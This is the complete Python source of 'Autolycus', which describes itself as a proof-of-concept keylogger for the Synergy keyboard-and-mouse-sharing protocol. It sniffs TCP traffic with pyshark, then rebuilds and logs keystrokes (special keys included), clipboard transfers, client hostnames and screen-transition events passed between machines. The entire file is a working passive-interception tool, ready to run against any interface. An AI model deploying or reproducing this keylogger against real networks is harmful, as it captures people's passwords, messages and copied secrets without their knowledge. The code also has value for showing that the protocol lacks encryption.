import pyshark
import argparse
import sys
import logging
import time
import re
from threading import Thread
from collections import defaultdict
from textwrap import wrap
from fabulous import text
from colorlog import ColoredFormatter


class Autolycus(object):
    __slots__ = ["interface", "wrap_limit", "keystroke_wait_time", "redundant_wait_time", "capture", "log", "active_connections", "temp_keystrokes", "temp_clipboard", "processing_clipboard", "processing_entering", "processing_leaving"]

    # packet type constants
    PACKET = {
        "HANDSHAKE": "handshake",
        "QUERY_INFO": "qinf",
        "CLIENT_DATA": "client_data",
        "ACK": "ack", 
        "KEEP_ALIVE": "calv",
        "MOUSE_MOVEMENT": "mousemoved",
        "MOUSE_DOWN": "mousebuttonpressed",
        "MOUSE_UP": "mousebuttonreleased",
        "KEYSTROKE_DOWN": "keypressed",
        "KEYSTROKE_UP": "keyreleased",
        "CLIPBOARD": "clipboard",
        "CLIPBOARD_DATA": "clipboarddata",
        "NO_OPERATION": "cnop",
        "UNKNOWN": "unknown",
        "LEAVING_SCREEN": "cout",
        "ENTERING_SCREEN": "cinn"
    }

    # non-ASCII keycodes
    SPECIAL_KEYCODES = {
        61193: "TAB",
        61192: "BACKSPACE",
        61197: "ENTER",
        61211: "ESCAPE",
        61266: "ARROW UP",
        61268: "ARROW DOWN",
        61265: "ARROW LEFT",
        61267: "ARROW RIGHT",
        61281: "PRINT SCREEN",
        61374: "F1",
        61375: "F2",
        61376: "F3",
        61377: "F4",
        61378: "F5",
        61379: "F6",
        61380: "F7",
        61381: "F8",
        61382: "F9",
        61383: "F10",
        61384: "F11",
        61385: "F12",
        61409: "LEFT SHIFT",
        61410: "RIGHT SHIFT",
        61411: "LEFT CONTROL",
        61412: "RIGHT CONTROL",
        61413: "CAPS LOCK",
        61417: "LEFT ALT",
        61418: "RIGHT ALT",
        61419: "LEFT WINDOWS",
        61420: "RIGHT WINDOWS"
    }

    # logging constants
    HDSHK = 5
    SETUP = 6
    DATA = 7
    CONN = 8
    INFO = 9

    def __init__(self, interface, wrap_limit, keystroke_wait_time, redundant_wait_time):
        self.interface = interface
        self.wrap_limit = wrap_limit
        self.keystroke_wait_time = keystroke_wait_time
        self.redundant_wait_time = redundant_wait_time
        self.capture = pyshark.LiveCapture(interface=interface, bpf_filter="tcp")
        self.log = self.setup_logger()
        self.active_connections = set()
        self.temp_keystrokes = defaultdict(list)
        self.temp_clipboard = ""
        self.processing_clipboard = self.processing_entering = self.processing_leaving = False

    def start(self):
        self.print_banner()
        self.log.info("Listening for events...")
        self.listen_loop()

    def listen_loop(self):
        for packet in self.capture.sniff_continuously():
            if "Synergy" in packet and len(packet.synergy.field_names) > 0:
                packet_type = packet.synergy.field_names[0]

                if packet.ip.src not in self.active_connections and packet.ip.dst not in self.active_connections:
                    self.active_connections.add(packet.ip.src)
                    self.active_connections.add(packet.ip.dst)
                    self.log.log(self.CONN, f"Discovered ongoing session between {packet.ip.dst} <-> {packet.ip.src}")

                if packet_type == self.PACKET["HANDSHAKE"]:
                    self.handle_handshake(packet)
                elif packet_type == self.PACKET["QUERY_INFO"]:
                    self.handle_query_info(packet)
                elif packet_type == self.PACKET["CLIENT_DATA"]:
                    self.handle_client_data(packet)
                elif packet_type == self.PACKET["ACK"]:
                    self.handle_ack(packet)
                elif packet_type == self.PACKET["KEEP_ALIVE"]:
                    pass
                elif packet_type == self.PACKET["NO_OPERATION"]:
                    pass
                elif packet_type == self.PACKET["UNKNOWN"]:
                    pass
                elif packet_type == self.PACKET["MOUSE_MOVEMENT"]:
                    pass
                elif packet_type == self.PACKET["MOUSE_DOWN"]:
                    pass
                elif packet_type == self.PACKET["MOUSE_UP"]:
                    pass
                elif packet_type == self.PACKET["KEYSTROKE_DOWN"]:
                    self.handle_keystroke(packet)
                elif packet_type == self.PACKET["KEYSTROKE_UP"]:
                    pass
                elif packet_type == self.PACKET["CLIPBOARD"]:
                    self.handle_clipboard(packet)
                elif packet_type == self.PACKET["CLIPBOARD_DATA"]:
                    self.handle_clipboard_data(packet)
                elif packet_type == self.PACKET["ENTERING_SCREEN"]:
                    self.handle_entering_screen(packet)
                elif packet_type == self.PACKET["LEAVING_SCREEN"]:
                    self.handle_leaving_screen(packet)
                elif len(packet.synergy.field_names) > 0:
                    packet.synergy.pretty_print()
                    print(packet.synergy.field_names)

    def handle_handshake(self, packet):
        self.active_connections.add(packet.ip.src)
        self.log.log(self.HDSHK, f"{packet.ip.src} is establishing a connection with {packet.ip.dst}")
        self.log.log(self.HDSHK, f"\tVersion: Synergy v{packet.synergy.handshake_majorversion}.{packet.synergy.handshake_minorversion}")
        if ({packet.ip.src, packet.ip.dst}.issubset(self.active_connections)):
            self.log.log(self.HDSHK, f"Connection established between {packet.ip.dst} <-> {packet.ip.src}")
            self.log.log(self.HDSHK, f"\tServer: {packet.ip.dst}")
            self.log.log(self.HDSHK, f"\tClient: {packet.ip.src}, hostname: {packet.synergy.handshake_client}")

    def handle_query_info(self, packet):
        self.log.log(self.SETUP, f"{packet.ip.src} is requesting screen settings")

    def handle_ack(self, packet):
        self.log.log(self.SETUP, f"{packet.ip.src} has acknowledged the sent settings")

    def handle_client_data(self, packet):
        self.log.log(self.SETUP, f"{packet.ip.src} is confirming server screen settings")
        for field in packet.synergy._get_all_fields_with_alternates()[1:]:
            self.log.log(self.SETUP, f"\t{packet.synergy._get_field_repr(field)}")

    def handle_keystroke(self, packet):
        if len(self.temp_keystrokes[hash(packet.ip.src + packet.ip.dst) & ((1 << 32) - 1)]) == 0:
            self.log.log(self.INFO, f"({packet.ip.src} -> {packet.ip.dst}) sending keystrokes, collecting until {self.keystroke_wait_time} seconds of inactivity...")
            Thread(target=self.keystroke_listener, args=(packet.ip.src, packet.ip.dst)).start()
        keycode = int(packet.synergy.keypressed_keyid)
        if keycode in self.SPECIAL_KEYCODES:
            self.temp_keystrokes[hash(packet.ip.src + packet.ip.dst) & ((1 << 32) - 1)].append(f" <{self.SPECIAL_KEYCODES[keycode]}> ")
        else:
            self.temp_keystrokes[hash(packet.ip.src + packet.ip.dst) & ((1 << 32) - 1)].append(chr(keycode))
    
    def keystroke_listener(self, src, dst):
        wait = self.keystroke_wait_time
        start_size = len(self.temp_keystrokes[hash(src + dst) & ((1 << 32) - 1)])
        while wait > 0:
            if len(self.temp_keystrokes[hash(src + dst) & ((1 << 32) - 1)]) != start_size:
                wait = self.keystroke_wait_time
                start_size = len(self.temp_keystrokes[hash(src + dst) & ((1 << 32) - 1)])
            else:
                wait -= 1
            time.sleep(1)
        self.log.log(self.INFO, f"({src} -> {dst}) collected keystrokes:")
        [self.log.log(self.DATA, f"\t{batch}") for batch in wrap(''.join(self.temp_keystrokes[hash(src + dst) & ((1 << 32) - 1)]), self.wrap_limit)]
        self.temp_keystrokes[hash(src + dst) & ((1 << 32) - 1)].clear()

    def handle_clipboard(self, packet):
        if not self.processing_clipboard:
            self.processing_clipboard = True
            Thread(target=self.clipboard_listener, args=(packet,)).start()

    def clipboard_listener(self, packet):
        time.sleep(self.redundant_wait_time)
        self.processing_leaving = False
        self.log.log(self.INFO, f"({packet.ip.src} -> {packet.ip.dst}) grabbing clipboard")

    def handle_clipboard_data(self, packet):
        try:
            raw = packet.synergy.get_field("clipboarddata_data").binary_value.decode(encoding="unicode_escape")
            clipboard = repr(raw).split("\\x")[-1][3:-1]
            if clipboard and len(clipboard) > 3 and not clipboard[:3].isnumeric() and clipboard != self.temp_clipboard:
                self.temp_clipboard = clipboard
                self.log.log(self.INFO, f"{packet.ip.src} -> {packet.ip.dst} transferring clipboard data:")
                self.log.log(self.DATA, f"\t{clipboard}")
        except UnicodeDecodeError: pass

    def handle_entering_screen(self, packet):
        if not self.processing_entering:
            self.processing_entering = True
            Thread(target=self.entering_listener, args=(packet,)).start()

    def entering_listener(self, packet):
        time.sleep(self.redundant_wait_time)
        self.processing_entering = False
        self.log.log(self.INFO, f"({packet.ip.src} -> {packet.ip.dst}) entering screen")
        self.log.log(self.DATA, f"\tScreen X: {packet.synergy.cinn_x}")
        self.log.log(self.DATA, f"\tScreen Y: {packet.synergy.cinn_y}")

    def handle_leaving_screen(self, packet):
        if not self.processing_leaving:
            self.processing_leaving = True
            Thread(target=self.leaving_listener, args=(packet,)).start()

    def leaving_listener(self, packet):
        time.sleep(self.redundant_wait_time)
        self.processing_leaving = False
        self.log.log(self.INFO, f"({packet.ip.src} -> {packet.ip.dst}) leaving screen")

    def print_banner(self):
        BANNER_WIDTH = 115
        print("*" * BANNER_WIDTH)
        print(text.Text("Autolycus", color="#EF9C70", shadow=True, skew=3))
        print("*" * BANNER_WIDTH)
        print("Author: Michael Van Leeuwen".center(BANNER_WIDTH, ' '))
        print("github.com/MJVL/Autolycus".center(BANNER_WIDTH, ' '))
        print("*" * BANNER_WIDTH)

    def setup_logger(self):
        logging.addLevelName(self.HDSHK, "HDSHK")
        logging.addLevelName(self.SETUP, "SETUP")
        logging.addLevelName(self.DATA, "DATA")
        logging.addLevelName(self.CONN, "CONN")
        logging.addLevelName(self.INFO, "INFO")
        formatter = ColoredFormatter(
            "%(asctime)s | %(log_color)s%(levelname)-5s%(reset)s | %(log_color)s%(reset)s%(message)s",
            datefmt="%H:%M:%S",
            reset=True,
            log_colors={
                'INFO': 'green',
                'HDSHK': 'green',
                'SETUP': 'green',
                'DATA': 'green',
                'CONN': 'green'
            }
        )
        logger = logging.getLogger('example')
        handler = logging.StreamHandler()
        handler.setFormatter(formatter)
        logger.addHandler(handler)
        logger.setLevel("HDSHK")
        return logger


def main():
    parser = argparse.ArgumentParser(description="A proof of concept keylogger for the Synergy protocol.")
    parser.add_argument("interface", help="The interface to listen on.", type=str)
    parser.add_argument("-w", "--wrap_limit", help="The max amount of characters to print on a single line when dumping keystrokes/clipboard data.", type=int, default=200)
    parser.add_argument("-k", "--keystroke_wait_time", help="The time in seconds to wait without hearing new keystrokes before printing the dump.", type=int, default=5)
    parser.add_argument("-r", "--redundant_wait_time", help="The time in seconds to wait before printing actions which commonly contain duplicates. Longer window = less duplicates.", type=int, default=1)
    args = parser.parse_args()

    autolycus = Autolycus(args.interface, args.wrap_limit, args.keystroke_wait_time, args.redundant_wait_time)
    autolycus.start()

    
if __name__ == "__main__":
    main()
